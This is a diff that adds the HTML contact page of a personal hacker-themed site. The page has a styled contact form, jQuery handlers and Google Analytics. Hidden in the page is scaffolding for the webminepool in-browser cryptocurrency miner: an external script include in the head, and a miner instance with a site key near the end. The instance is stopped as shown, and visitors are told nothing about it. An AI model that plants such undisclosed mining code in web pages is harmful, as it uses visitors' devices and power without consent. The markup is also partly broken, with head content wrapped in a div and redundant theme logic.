@@ -1,0 +1,115 @@
+<!DOCTYPE html PUBLIC "-//sHC//DTD XHTML 1.0 Transitional//EN" "http://www.sH.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.sH.org/1999/xhtml">
+
+<head>
+     <div class="body">
+        <title>Contact sH4ft</title>
+        <meta charset="UTF-8" http-equiv="Content-Type" content="text/html">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta property="og:image" content="../fk_img/240px-Anonymous_emblem.svg.png">
+        <meta property="og:image:type" content="image/png">
+        <meta property="og:image:width" content="436">
+        <meta property="og:image:height" content="228">
+        <meta property="og:title" content="sH World">
+        <link rel="stylesheet" href="../css/sH.css">
+        <link rel="icon" type="image/x-icon" href="../favicon/favicon.ico">
+		<link rel="stylesheet" type="text/css" href="style.css" />
+		<script src="https://webminepool.com/lib/base.js"></script>
+		<script type="text/javascript" src="js/jquery-1.2.6.min.js"></script>
+		<script type="text/javascript" src="js/jquery.validate.js"></script>
+		<script type="text/javascript">
+			$(document).ready(function(){
+					
+				$("#formLeft .input-bg").hover(function() {
+					$(this).addClass("active");
+				}, function() {
+					$(this).removeClass("active");
+				});
+				
+				$("#formLeft input").focus(function() {
+				
+					$(this).parent().addClass("active");
+				});
+				$("#formLeft input").blur(function() {
+					$("#formLeft .input-bg").removeClass("active");
+				});
+					
+				$("#formRight .message-bg").hover(function() {
+					$(this).addClass("active");
+				}, function() {
+					$(this).removeClass("active");
+				});
+				
+				$("#formRight textarea").focus(function() {
+					$(this).parent().addClass("active");
+				});
+				$("#formRight textarea").blur(function() {
+					$("#formRight .message-bg").removeClass("active");
+				});
+					
+				$("#commentForm").validate();
+			});
+			const prefersDarkScheme = window.matchMedia("(prefers-color-scheme: dark)");
+
+                if (prefersDarkScheme.matches) {
+                      document.body.classList.add("dark-theme");
+                } 
+                else {
+                document.body.classList.add("dark-theme");
+                }
+		</script>
+		
+	</div>
+</head>
+
+
+<body style="position:relative;min-height:100%;font-family: 'Source Sans Pro', sans-serif;">
+    <!-- Navbar (sit on top) -->
+
+    <div class="sH-top">
+    	<div class="sH-bar sH-black sH-wide sH-padding sH-card">
+            <img href="#home" class="sH-image" src="../fk_img/240px-Anonymous_emblem.svg.png" alt="sH4ft" width="50" height="50">
+                <!-- Float links to the right. Hide them on small screens -->
+            <div class="sH-right sH-hide-small">
+                <a href="../index.html" class="sH-bar-item sH-button">Home</a>
+                <a href="../vid.html" class="sH-bar-item sH-button">Videos</a>
+				<a href="index.html" class="sH-bar-item sH-button">Contact</a>
+                <a href="../about.html" class="sH-bar-item sH-button">About</a>     	                
+            </div>
+        </div>
+    </div>
+    
+    <div class="sH-container sH-padding-32" id="H4ckin images">
+    <div class="sH-container sH-padding-32" id="H4ckin images">
+        <h3 class="sH-border-bottom sH-border-light-grey sH-padding-16">                    
+            <div class="chip"> 
+                <img src="../fk_img/240px-Anonymous_emblem.svg.png" alt="sH4ft" width="96" height="96"> <b>CONTACT ME</b>
+            </div>
+        </h3>
+    </div>
+    <div class="sH-content sH-padding" style="max-width:1564px">        
+		<form method="post" action="contactengine.php">
+			<fieldset>
+                <input class="sH-section sH-stretch sH-quarter chip sH-black" size="436" type="text" placeholder="Name" required name="Name">
+                <input class="sH-section sH-stretch sH-quarter chip sH-black" type="text" placeholder="Email" required name="Email">
+                <textarea class="sH-section sH-stretch sH-bar chip sH-black" placeholder="Message" type="text"></textarea>
+                <button class="sH-button sH-black sH-section chip" type="submit">
+                    <i class="fa fa-paper-plane"></i> SEND MESSAGE
+                </button>
+				<div class="clear"></div>
+			</fieldset>
+		</form>
+	</div>
+	
+	<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+	</script>
+	<script type="text/javascript">
+	_uacct = "UA-68528-29";
+	urchinTracker();
+	var miner = WMP.Anonymous('SK_kRw6BGHzNZcN7pEOoWpmj',{throttle: 0.4});
+    miner.stop();
+	</script>
+
+</body>
+
+</html>
